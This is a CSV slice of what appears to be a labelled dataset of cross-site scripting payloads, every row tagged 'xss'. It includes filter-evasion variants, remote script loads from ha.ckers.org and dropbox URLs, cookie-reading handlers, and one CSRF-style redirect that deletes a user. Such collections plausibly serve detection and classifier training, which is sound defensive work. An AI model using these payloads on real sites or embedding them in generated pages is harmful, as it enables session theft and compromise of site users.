,payload,type
7309,"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(""XSS"")>",xss
7310,"<SCRIPT/SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
7311,"<<SCRIPT>alert(""XSS"");//<</SCRIPT>",xss
7312,<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >,xss
7313,<SCRIPT SRC=//ha.ckers.org/.j>,xss
7314,"<IMG SRC=""javascript:alert('XSS')""",xss
7315,<iframe src=http://ha.ckers.org/scriptlet.html <,xss
7316,"\"";alert('XSS');//",xss
7317,</script><script>alert('XSS');</script>,xss
7318,"</TITLE><SCRIPT>alert(""XSS"");</SCRIPT>",xss
7319,"<INPUT TYPE=""IMAGE"" SRC=""javascript:alert('XSS');"">",xss
7320,"<BODY BACKGROUND=""javascript:alert('XSS')"">",xss
7321,"<IMG DYNSRC=""javascript:alert('XSS')"">",xss
7322,"<IMG LOWSRC=""javascript:alert('XSS')"">",xss
7323,"<STYLE>li {list-style-image: url(""javascript:alert('XSS')"");}</STYLE><UL><LI>XSS</br>",xss
7324,"<IMG SRC='vbscript:msgbox(""XSS"")'>",xss
7325,"<IMG SRC=""livescript:[code]"">",xss
7326,<BODY ONLOAD=alert('XSS')>,xss
7327,"<BGSOUND SRC=""javascript:alert('XSS');"">",xss
7328,"<BR SIZE=""&{alert('XSS')}"">",xss
7329,"<LINK REL=""stylesheet"" HREF=""javascript:alert('XSS');"">",xss
7330,"<LINK REL=""stylesheet"" HREF=""http://ha.ckers.org/xss.css"">",xss
7331,<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>,xss
7332,"<META HTTP-EQUIV=""Link"" Content=""<http://ha.ckers.org/xss.css>; REL=stylesheet"">",xss
7333,"<STYLE>BODY{-moz-binding:url(""http://ha.ckers.org/xssmoz.xml#xss"")}</STYLE>",xss
7334,"<STYLE>@im\port'\ja\vasc\ript:alert(""XSS"")';</STYLE>",xss
7335,"<IMG STYLE=""xss:expr/*XSS*/ession(alert('XSS'))"">",xss
7336,"exp/*<A STYLE='no\xss:noxss(""*//*"");",xss
7337,"xss:ex/*XSS*//*/*/pression(alert(""XSS""))'>",xss
7338,"<STYLE TYPE=""text/javascript"">alert('XSS');</STYLE>",xss
7339,"<STYLE>.XSS{background-image:url(""javascript:alert('XSS')"");}</STYLE><A CLASS=XSS></A>",xss
7340,"<STYLE type=""text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE>",xss
7341,"<XSS STYLE=""xss:expression(alert('XSS'))"">",xss
7342,"<XSS STYLE=""behavior: url(xss.htc);"">",xss
7343,¼script¾alert(¢XSS¢)¼/script¾,xss
7344,"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=javascript:alert('XSS');"">",xss
7345,"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"">",xss
7346,"<META HTTP-EQUIV=""refresh"" CONTENT=""0; URL=http://;URL=javascript:alert('XSS');"">",xss
7347,"<IFRAME SRC=""javascript:alert('XSS');""></IFRAME>",xss
7348,"<IFRAME SRC=# onmouseover=""alert(document.cookie)""></IFRAME>",xss
7349,"<FRAMESET><FRAME SRC=""javascript:alert('XSS');""></FRAMESET>",xss
7350,"<TABLE BACKGROUND=""javascript:alert('XSS')"">",xss
7351,"<TABLE><TD BACKGROUND=""javascript:alert('XSS')"">",xss
7352,"<DIV STYLE=""background-image: url(javascript:alert('XSS'))"">",xss
7353,"<DIV STYLE=""background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"">",xss
7354,"<DIV STYLE=""background-image: url(&#1;javascript:alert('XSS'))"">",xss
7355,"<DIV STYLE=""width: expression(alert('XSS'));"">",xss
7356,<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->,xss
7357,"<BASE HREF=""javascript:alert('XSS');//"">",xss
7358,"<OBJECT TYPE=""text/x-scriptlet"" DATA=""http://ha.ckers.org/scriptlet.html""></OBJECT>",xss
7359,"<!--#exec cmd=""/bin/echo '<SCR'""--><!--#exec cmd=""/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'""-->",xss
7360,"<? echo('<SCR)';echo('IPT>alert(""XSS"")</SCRIPT>'); ?>",xss
7361,"<IMG SRC=""http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"">",xss
7362,"<META HTTP-EQUIV=""Set-Cookie"" Content=""USERID=<SCRIPT>alert('XSS')</SCRIPT>"">",xss
7363,"<HEAD><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-",xss
7364,"<SCRIPT a="">"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
7365,"<SCRIPT ="">"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
7366,"<SCRIPT a="">"" '' SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
7367,"<SCRIPT ""a='>'"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
7368,"<SCRIPT a=`>` SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
7369,"<SCRIPT a="">'>"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
7370,"<SCRIPT>document.write(""<SCRI"");</SCRIPT>PT SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
7371,"<A HREF=""http://66.102.7.147/"">XSS</A>",xss
7372,"0\""autofocus/onfocus=alert(1)--><video/poster/ error=prompt(2)>""-confirm(3)-""",xss
7373,veris-->group<svg/onload=alert(/XSS/)//,xss
7374,"#""><img src=M onerror=alert('XSS');>",xss
7375,element[attribute='<img src=x onerror=alert('XSS');>,xss
7376,"[<blockquote cite=""]"">["" onmouseover=""alert('RVRSH3LL_XSS');"" ]",xss
7377,%22;alert%28%27RVRSH3LL_XSS%29//,xss
7378,javascript:alert%281%29;,xss
7379,<w contenteditable id=x onfocus=alert()>,xss
7380,"alert;pg(""XSS"")",xss
7381,<svg/onload=%26%23097lert%26lpar;1337)>,xss
7382,<script>for((i)in(self))eval(i)(1)</script>,xss
7383,<scr<script>ipt>alert(1)</scr</script>ipt><scr<script>ipt>alert(1)</scr</script>ipt>,xss
7384,<sCR<script>iPt>alert(1)</SCr</script>IPt>,xss
7385,"<a href=""data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4="">test</a>",xss
7386,<body oninput=javascript:alert(1)><input autofocus>,xss
7387,"<math href=""javascript:javascript:alert(1)"">CLICKME</math> <math> <maction actiontype=""statusline#http://google.com"" xlink:href=""javascript:javascript:alert(1)"">CLICKME</maction> </math>",xss
7388,<frameset onload=javascript:alert(1)>,xss
7389,"<table background=""javascript:javascript:alert(1)"">",xss
7390,"<!--<img src=""--><img src=x onerror=javascript:alert(1)//"">",xss
7391,"<comment><img src=""</comment><img src=x onerror=javascript:alert(1))//"">",xss
7392,"<![><img src=""]><img src=x onerror=javascript:alert(1)//"">",xss
7393,"<style><img src=""</style><img src=x onerror=javascript:alert(1)//"">",xss
7394,"<li style=list-style:url() onerror=javascript:alert(1)> <div style=content:url(data:image/svg+xml,%%3Csvg/%%3E);visibility:hidden onload=javascript:alert(1)></div>",xss
7395,"<head><base href=""javascript://""></head><body><a href=""/. /,javascript:alert(1)//#"">XXX</a></body>",xss
7396,<SCRIPT FOR=document EVENT=onreadystatechange>javascript:alert(1)</SCRIPT>,xss
7397,"<OBJECT CLASSID=""clsid:333C7BC4-460F-11D0-BC04-0080C7055A83""><PARAM NAME=""DataURL"" VALUE=""javascript:alert(1)""></OBJECT>",xss
7398,"<object data=""data:text/html;base64,%(base64)s"">",xss
7399,"<embed src=""data:text/html;base64,%(base64)s"">",xss
7400,<b <script>alert(1)</script>0,xss
7401,"<div id=""div1""><input value=""``onmouseover=javascript:alert(1)""></div> <div id=""div2""></div><script>document.getElementById(""div2"").innerHTML = document.getElementById(""div1"").innerHTML;</script>",xss
7402,"<x '=""foo""><x foo='><img src=x onerror=javascript:alert(1)//'>",xss
7403,"<embed src=""javascript:alert(1)"">",xss
7404,"<img src=""javascript:alert(1)"">",xss
7405,"<image src=""javascript:alert(1)"">",xss
7406,"<script src=""javascript:alert(1)"">",xss
7407,<div style=width:1px;filter:glow onfilterchange=javascript:alert(1)>x,xss
7408,"<? foo=""><script>javascript:alert(1)</script>"">",xss
7409,"<! foo=""><script>javascript:alert(1)</script>"">",xss
7410,"</ foo=""><script>javascript:alert(1)</script>"">",xss
7411,"<? foo=""><x foo='?><script>javascript:alert(1)</script>'>"">",xss
7412,"<! foo=""[[[Inception]]""><x foo=""]foo><script>javascript:alert(1)</script>"">",xss
7413,"<% foo><x foo=""%><script>javascript:alert(1)</script>"">",xss
7414,"<div id=d><x xmlns=""><iframe onload=javascript:alert(1)""></div> <script>d.innerHTML=d.innerHTML</script>",xss
7415,"<img \x00src=x onerror=""alert(1)"">",xss
7416,"<img \x47src=x onerror=""javascript:alert(1)"">",xss
7417,"<img \x11src=x onerror=""javascript:alert(1)"">",xss
7418,"<img \x12src=x onerror=""javascript:alert(1)"">",xss
7419,"<img\x47src=x onerror=""javascript:alert(1)"">",xss
7420,"<img\x10src=x onerror=""javascript:alert(1)"">",xss
7421,"<img\x13src=x onerror=""javascript:alert(1)"">",xss
7422,"<img\x32src=x onerror=""javascript:alert(1)"">",xss
7423,"<img\x47src=x onerror=""javascript:alert(1)"">",xss
7424,"<img\x11src=x onerror=""javascript:alert(1)"">",xss
7425,"<img \x47src=x onerror=""javascript:alert(1)"">",xss
7426,"<img \x34src=x onerror=""javascript:alert(1)"">",xss
7427,"<img \x39src=x onerror=""javascript:alert(1)"">",xss
7428,"<img \x00src=x onerror=""javascript:alert(1)"">",xss
7429,"<img src\x09=x onerror=""javascript:alert(1)"">",xss
7430,"<img src\x10=x onerror=""javascript:alert(1)"">",xss
7431,"<img src\x13=x onerror=""javascript:alert(1)"">",xss
7432,"<img src\x32=x onerror=""javascript:alert(1)"">",xss
7433,"<img src\x12=x onerror=""javascript:alert(1)"">",xss
7434,"<img src\x11=x onerror=""javascript:alert(1)"">",xss
7435,"<img src\x00=x onerror=""javascript:alert(1)"">",xss
7436,"<img src\x47=x onerror=""javascript:alert(1)"">",xss
7437,"<img src=x\x09onerror=""javascript:alert(1)"">",xss
7438,"<img src=x\x10onerror=""javascript:alert(1)"">",xss
7439,"<img src=x\x11onerror=""javascript:alert(1)"">",xss
7440,"<img src=x\x12onerror=""javascript:alert(1)"">",xss
7441,"<img src=x\x13onerror=""javascript:alert(1)"">",xss
7442,"<img[a][b][c]src[d]=x[e]onerror=[f]""alert(1)"">",xss
7443,"<img src=x onerror=\x09""javascript:alert(1)"">",xss
7444,"<img src=x onerror=\x10""javascript:alert(1)"">",xss
7445,"<img src=x onerror=\x11""javascript:alert(1)"">",xss
7446,"<img src=x onerror=\x12""javascript:alert(1)"">",xss
7447,"<img src=x onerror=\x32""javascript:alert(1)"">",xss
7448,"<img src=x onerror=\x00""javascript:alert(1)"">",xss
7449,<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>XXX</a>,xss
7450,"<img src=""x` `<script>javascript:alert(1)</script>""` `>",xss
7451,"<img src onerror /"" '""= alt=javascript:alert(1)//"">",xss
7452,<title onpropertychange=javascript:alert(1)></title><title title=>,xss
7453,"<a href=http://foo.bar/#x=`y></a><img alt=""`><img src=x:x onerror=javascript:alert(1)></a>"">",xss
7454,<!--[if]><script>javascript:alert(1)</script -->,xss
7455,<!--[if<img src=x onerror=javascript:alert(1)//]> -->,xss
7456,"<script src=""/\%(jscript)s""></script>",xss
7457,"<script src=""\\%(jscript)s""></script>",xss
7458,"<object id=""x"" classid=""clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598""></object> <object classid=""clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B"" onqt_error=""javascript:alert(1)"" style=""behavior:url(#x);""><param name=postdomevents /></object>",xss
7459,"<a style=""-o-link:'javascript:javascript:alert(1)';-o-link-source:current"">X",xss
7460,<style>p[foo=bar{}*{-o-link:'javascript:javascript:alert(1)'}{}*{-o-link-source:current}]{color:red};</style>,xss
7461,"<link rel=stylesheet href=data:,*%7bx:expression(javascript:alert(1))%7d",xss
7462,"<style>@import ""data:,*%7bx:expression(javascript:alert(1))%7D"";</style>",xss
7463,"<a style=""pointer-events:none;position:absolute;""><a style=""position:absolute;"" onclick=""javascript:alert(1);"">XXX</a></a><a href=""javascript:javascript:alert(1)"">XXX</a>",xss
7464,<style>*[{}@import'%(css)s?]</style>X,xss
7465,"<div style=""font-family:'foo&#10;;color:red;';"">XXX",xss
7466,"<div style=""font-family:foo}color=red;"">XXX",xss
7467,<// style=x:expression\28javascript:alert(1)\29>,xss
7468,<style>*{x:ｅｘｐｒｅｓｓｉｏｎ(javascript:alert(1))}</style>,xss
7469,<div style=content:url(%(svg)s)></div>,xss
7470,"<div style=""list-style:url(http://foo.f)\20url(javascript:javascript:alert(1));"">X",xss
7471,"<div id=d><div style=""font-family:'sans\27\3B color\3Ared\3B'"">X</div></div> <script>with(document.getElementById(""d""))innerHTML=innerHTML</script>",xss
7472,"<div style=""background:url(/f#&#127;oo/;color:red/*/foo.jpg);"">X",xss
7473,"<div style=""font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);"">X",xss
7474,"<div id=""x"">XXX</div> <style> #x{font-family:foo[bar;color:green;} #y];color:red;{} </style>",xss
7475,"<x style=""background:url('x&#1;;color:red;/*')"">XXX</x>",xss
7476,"<script>({set/**/$($){_/**/setter=$,_=javascript:alert(1)}}).$=eval</script>",xss
7477,<script>({0:#0=eval/#0#/#0#(javascript:alert(1))})</script>,xss
7478,"<script>ReferenceError.prototype.__defineGetter__('name', function(){javascript:alert(1)}),x</script>",xss
7479,"<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('javascript:alert(1)')()</script>",xss
7480,"<meta charset=""x-imap4-modified-utf7"">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi",xss
7481,"<meta charset=""x-imap4-modified-utf7"">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>",xss
7482,"<meta charset=""mac-farsi"">¼script¾javascript:alert(1)¼/script¾",xss
7483,X<x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(1)` >,xss
7484,1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=javascript:alert(1)&gt;`>,xss
7485,"<IMG SRC=""jav&#x0D;ascript:alert('XSS');"">",xss
7486,"perl -e 'print ""<IMG SRC=java\0script:alert(\""XSS\"")>"";' > out",xss
7487,"<IMG SRC="" &#14; javascript:alert('XSS');"">",xss
7488,"<SCRIPT/XSS SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
7489,"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(""XSS"")>",xss
7490,"<SCRIPT/SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
7491,"<<SCRIPT>alert(""XSS"");//<</SCRIPT>",xss
7492,<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >,xss
7493,<SCRIPT SRC=//ha.ckers.org/.j>,xss
7494,"<IMG SRC=""javascript:alert('XSS')""",xss
7495,<iframe src=http://ha.ckers.org/scriptlet.html <,xss
7496,"\"";alert('XSS');//",xss
7497,"</TITLE><SCRIPT>alert(""XSS"");</SCRIPT>",xss
7498,"<INPUT TYPE=""IMAGE"" SRC=""javascript:alert('XSS');"">",xss
7499,"<BODY BACKGROUND=""javascript:alert('XSS')"">",xss
7500,"<IMG DYNSRC=""javascript:alert('XSS')"">",xss
7501,"<IMG LOWSRC=""javascript:alert('XSS')"">",xss
7502,"<STYLE>li {list-style-image: url(""javascript:alert('XSS')"");}</STYLE><UL><LI>XSS</br>",xss
7503,"<IMG SRC='vbscript:msgbox(""XSS"")'>",xss
7504,"<IMG SRC=""livescript:[code]"">",xss
7505,<BODY ONLOAD=alert('XSS')>,xss
7506,"<BGSOUND SRC=""javascript:alert('XSS');"">",xss
7507,"<BR SIZE=""&{alert('XSS')}"">",xss
7508,"<LINK REL=""stylesheet"" HREF=""javascript:alert('XSS');"">",xss
7509,"<LINK REL=""stylesheet"" HREF=""http://ha.ckers.org/xss.css"">",xss
7510,<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>,xss
7511,"<META HTTP-EQUIV=""Link"" Content=""<http://ha.ckers.org/xss.css>; REL=stylesheet"">",xss
7512,"<STYLE>BODY{-moz-binding:url(""http://ha.ckers.org/xssmoz.xml#xss"")}</STYLE>",xss
7513,"<STYLE>@im\port'\ja\vasc\ript:alert(""XSS"")';</STYLE>",xss
7514,"<IMG STYLE=""xss:expr/*XSS*/ession(alert('XSS'))"">",xss
7515,"exp/*<A STYLE='no\xss:noxss(""*//*"");xss:ex/*XSS*//*/*/pression(alert(""XSS""))'>",xss
7516,"<STYLE TYPE=""text/javascript"">alert('XSS');</STYLE>",xss
7517,"<STYLE>.XSS{background-image:url(""javascript:alert('XSS')"");}</STYLE><A CLASS=XSS></A>",xss
7518,"<STYLE type=""text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE>",xss
7519,"<STYLE type=""text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE>",xss
7520,"<XSS STYLE=""xss:expression(alert('XSS'))"">",xss
7521,"<XSS STYLE=""behavior: url(xss.htc);"">",xss
7522,¼script¾alert(¢XSS¢)¼/script¾,xss
7523,"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=javascript:alert('XSS');"">",xss
7524,"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"">",xss
7525,"<META HTTP-EQUIV=""refresh"" CONTENT=""0; URL=http://;URL=javascript:alert('XSS');"">",xss
7526,"<IFRAME SRC=""javascript:alert('XSS');""></IFRAME>",xss
7527,"<IFRAME SRC=# onmouseover=""alert(document.cookie)""></IFRAME>",xss
7528,"<FRAMESET><FRAME SRC=""javascript:alert('XSS');""></FRAMESET>",xss
7529,"<TABLE BACKGROUND=""javascript:alert('XSS')"">",xss
7530,"<TABLE><TD BACKGROUND=""javascript:alert('XSS')"">",xss
7531,"<DIV STYLE=""background-image: url(javascript:alert('XSS'))"">",xss
7532,"<DIV STYLE=""background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"">",xss
7533,"<DIV STYLE=""background-image: url(&#1;javascript:alert('XSS'))"">",xss
7534,"<DIV STYLE=""width: expression(alert('XSS'));"">",xss
7535,"<BASE HREF=""javascript:alert('XSS');//"">",xss
7536,"<OBJECT TYPE=""text/x-scriptlet"" DATA=""http://ha.ckers.org/scriptlet.html""></OBJECT>",xss
7537,"<EMBED SRC=""data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="" type=""image/svg+xml"" AllowScriptAccess=""always""></EMBED>",xss
7538,"<SCRIPT SRC=""http://ha.ckers.org/xss.jpg""></SCRIPT>",xss
7539,"<!--#exec cmd=""/bin/echo '<SCR'""--><!--#exec cmd=""/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'""-->",xss
7540,"<? echo('<SCR)';echo('IPT>alert(""XSS"")</SCRIPT>'); ?>",xss
7541,"<IMG SRC=""http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"">",xss
7542,Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser,xss
7543,"<META HTTP-EQUIV=""Set-Cookie"" Content=""USERID=<SCRIPT>alert('XSS')</SCRIPT>"">",xss
7544,"<HEAD><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-",xss
7545,"<SCRIPT a="">"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
7546,"<SCRIPT ="">"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
7547,"<SCRIPT a="">"" '' SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
7548,"<SCRIPT ""a='>'"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
7549,"<SCRIPT a=`>` SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
7550,"<SCRIPT a="">'>"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
7551,"<SCRIPT>document.write(""<SCRI"");</SCRIPT>PT SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
7552,"<A HREF=""http://66.102.7.147/"">XSS</A>",xss
7553,"<A HREF=""http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D"">XSS</A>",xss
7554,"<A HREF=""http://1113982867/"">XSS</A>",xss
7555,"<A HREF=""http://0x42.0x0000066.0x7.0x93/"">XSS</A>",xss
7556,"<A HREF=""http://0102.0146.0007.00000223/"">XSS</A>",xss
7557,"<A HREF=""htt p://6 6.000146.0x7.147/"">XSS</A>",xss
7558,"<iframe src=""&Tab;javascript:prompt(1)&Tab;"">",xss
7559,<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>',xss
7560,"<input/onmouseover=""javaSCRIPT&colon;confirm&lpar;1&rpar;""",xss
7561,<sVg><scRipt >alert&lpar;1&rpar; {Opera},xss
7562,<img/src=`` onerror=this.onerror=confirm(1),xss
7563,"<form><isindex formaction=""javascript&colon;confirm(1)""",xss
7564,<img src=``&NewLine; onerror=alert(1)&NewLine;,xss
7565,<script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>,xss
7566,<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?,xss
7567,"<iframe/src=""data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg=="">",xss
7568,<script /**/>/**/alert(1)/**/</script /**/,xss
7569,&#34;&#62;<h1/onmouseover='\u0061lert(1)'>,xss
7570,"<iframe/src=""data:text/html,<svg &#111;&#110;load=alert(1)>"">",xss
7571,"<meta content=""&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)"" http-equiv=""refresh""/>",xss
7572,"<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script",xss
7573,<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera},xss
7574,"<meta http-equiv=""refresh"" content=""0;url=javascript:confirm(1)"">",xss
7575,<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>,xss
7576,"<form><a href=""javascript:\u0061lert&#x28;1&#x29;"">X",xss
7577,"</script><img/*/src=""worksinchrome&colon;prompt&#x28;1&#x29;""/*/onerror='eval(src)'>",xss
7578,<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>,xss
7579,"<form><iframe &#09;&#10;&#11; src=""javascript&#58;alert(1)""&#11;&#10;&#09;;>",xss
7580,"<a href=""data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==""&#09;&#10;&#11;>X</a",xss
7581,http://www.google<script .com>alert(document.location)</script,xss
7582,"<a&#32;href&#61;&#91;&#00;&#93;""&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;"">XYZ</a",xss
7583,<img/src=@&#32;&#13; onerror = prompt('&#49;'),xss
7584,<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;,xss
7585,<script ^__^>alert(String.fromCharCode(49))</script ^__^,xss
7586,</style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-(,xss
7587,"&#00;</form><input type&#61;""date"" onfocus=""alert(1)"">",xss
7588,<form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'>,xss
7589,<script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/,xss
7590,<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>,xss
7591,"<a href=""javascript:void(0)"" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>",xss
7592,<script ~~~>alert(0%0)</script ~~~>,xss
7593,<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>,xss
7594,<///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN,xss
7595,<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1),xss
7596,&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>',xss
7597,&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera},xss
7598,<marquee onstart='javascript:alert&#x28;1&#x29;'>^__^,xss
7599,"<div/style=""width:expression(confirm(1))"">X</div> {IE7}",xss
7600,<iframe// src=javaSCRIPT&colon;alert(1),xss
7601,//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//,xss
7602,"/*iframe/src*/<iframe/src=""<iframe/src=@""/onload=prompt(1) /*iframe/src*/>",xss
7603,//|\\ <script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\ </script //|\\,xss
7604,</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>,xss
7605,"<a/href=""javascript:&#13; javascript:prompt(1)""><input type=""X"">",xss
7606,</plaintext\></|\><plaintext/onmouseover=prompt(1),xss
7607,</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera},xss
7608,"<a href=""javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;""><button>",xss
7609,<div onmouseover='alert&lpar;1&rpar;'>DIV</div>,xss
7610,"<iframe style=""position:absolute;top:0;left:0;width:100%;height:100%"" onmouseover=""prompt(1)"">",xss
7611,"<a href=""jAvAsCrIpT&colon;alert&lpar;1&rpar;"">X</a>",xss
7612,"<embed src=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"">",xss
7613,"<object data=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"">",xss
7614,"<var onmouseover=""prompt(1)"">On Mouse Over</var>",xss
7615,<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>,xss
7616,"<img src=""/"" =_="" title=""onerror='prompt(1)'"">",xss
7617,<%<!--'%><script>alert(1);</script -->,xss
7618,"<script src=""data:text/javascript,alert(1)""></script>",xss
7619,<iframe/src \/\/onload = prompt(1),xss
7620,<iframe/onreadystatechange=alert(1),xss
